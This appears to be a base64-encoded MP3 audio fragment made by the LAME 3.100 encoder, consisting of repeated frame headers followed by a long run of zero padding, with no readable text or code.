qqqqqqqqqqqqqqqqqqqqqqqqqqkxBTUUzLjEwMKqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqr/82DEcAAAA0gAAAAAqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqpMQU1FMy4xMDCqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqr/82LEbwAAA0gAAAAAqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqTEFNRTMuMTAwqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq//NixG8AAANIAAAAAKqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqkxBTUUzLjEwMKqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqv/zYsRvAAADSAAAAACqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqkxBTUUzLjEwMKqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqr/82DEcAAAA0gAAAAAqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqpMQU1FMy4xMDCqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqr/82LEbwAAA0gAAAAAqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqTEFNRTMuMTAwqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq//NixG8AAANIAAAAAKqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqTEFNRTMuMTAwqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqv/zYMRwAAADSAAAAACqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqkxBTUUzLjEwMKqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqv/zYsRvAAADSAAAAACqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqpMQU1FMy4xMDCqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqr/82LEbwAAA0gAAAAAqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqTEFNRTMuMTAwqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq//NixG8AAANIAAAAAKqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqTEFNRTMuMTAwqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqv/zYMRwAAADSAAAAACqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqkxBTUUzLjEwMKqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqv/zYsRvAAADSAAAAACqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqpMQU1FMy4xMDCqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqr/82LEbwAAA0gAAAAAqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqTEFNRTMuMTAwqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq//NixG8AAANIAAAAAKqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqTEFNRTMuMTAwqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqv/zYMRwAAADSAAAAACqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqkxBTUUzLjEwMKqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqv/zYsRvAAADSAAAAACqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqpMQU1FMy4xMDCqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqr/82LEbwAAA0gAAAAAqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqTEFNRTMuMTAwqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq//NixG8AAANIAAAAAKqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqTEFNRTMuMTAwqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqv/zYMRwAAADSAAAAACqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqkxBTUUzLjEwMKqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqv/zYsRvAAADSAAAAACqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA